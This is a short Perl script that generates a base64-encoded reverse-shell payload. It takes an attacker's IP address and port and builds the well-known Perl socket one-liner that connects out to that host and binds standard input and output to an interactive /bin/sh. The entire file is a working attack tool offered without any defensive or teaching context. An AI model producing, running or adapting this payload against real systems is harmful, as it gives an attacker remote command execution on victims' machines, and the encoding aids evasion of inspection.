
use strict;
use warnings;
use MIME::Base64;

my $ip = shift;
my $port = shift;

print "Generating reverse shell payload...\n";

# Create the reverse shell command
my $cmd = "use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}";

# Encode the command in base64
my $payload = encode_base64($cmd);

print "Payload generated:\n\n$payload\n";
